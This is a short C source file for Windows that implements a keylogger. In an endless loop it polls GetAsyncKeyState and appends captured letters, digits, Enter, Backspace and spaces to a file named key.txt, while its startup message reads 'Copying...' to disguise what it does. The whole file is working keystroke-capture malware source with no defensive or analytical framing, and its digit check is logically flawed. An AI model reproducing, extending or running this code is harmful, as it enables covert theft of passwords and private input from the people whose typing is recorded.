#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<math.h>
#include<stdint.h>
#include<string.h>

//Function for just short the GetAsyncKeyState function
int get(int key){
    return GetAsyncKeyState(key);
}

void createFile(){
    //Verify if exists a file called "keys.txt" to open it
    FILE *file = fopen("key.txt","a");
    if(file == NULL){ //If doesn't exist, then create it
        system("echo \n >> key.txt"); 
    }
    fclose(file);
}

void keys(){
    createFile();
    FILE *file = fopen("key.txt", "a");
    
    //Verify normal keys as alphabet, numbers and some special keys as Backspace and Enter, using ASCII TABLE
    while(1){  
        Sleep(120);
        if(get(48) && get(96))fputs("0", file);
        if(get(49) && get(97))fputs("1", file);
        if(get(50) && get(98))fputs("2", file);
        if(get(51) && get(99))fputs("3", file);
        if(get(52) && get(100))fputs("4", file);
        if(get(53) && get(101))fputs("5", file);
        if(get(54) && get(102))fputs("6", file);
        if(get(55) && get(103))fputs("7", file);
        if(get(56) && get(104))fputs("8", file);
        if(get(57) && get(105))fputs("9", file);

        if(get(65))fputs("a", file);
        if(get(66))fputs("b", file);
        if(get(67))fputs("c", file);
        if(get(68))fputs("d", file);
        if(get(69))fputs("e", file);
        if(get(70))fputs("f", file);
        if(get(71))fputs("g", file);
        if(get(72))fputs("h", file);
        if(get(73))fputs("i", file);
        if(get(74))fputs("j", file);
        if(get(75))fputs("k", file);
        if(get(76))fputs("l", file);
        if(get(77))fputs("m", file);
        if(get(78))fputs("n", file);
        if(get(79))fputs("o", file);
        if(get(80))fputs("p", file);
        if(get(81))fputs("q", file);
        if(get(82))fputs("r", file);
        if(get(83))fputs("s", file);
        if(get(84))fputs("t", file);
        if(get(85))fputs("u", file);
        if(get(86))fputs("v", file);
        if(get(87))fputs("w", file);
        if(get(88))fputs("x", file);
        if(get(89))fputs("y", file);
        if(get(90))fputs("z", file);        

        if(get(13))fputs("{ENTER}\n", file);
        if(get(8))fputs("{BACKSPACE}\n", file);
        if(get(32))fputs(" ", file);
   }
}
int main(){
    printf("Copying...");
    for(;;){
        keys();
        
    }
    return 0;
    //to stop the program use CTRL + C
}




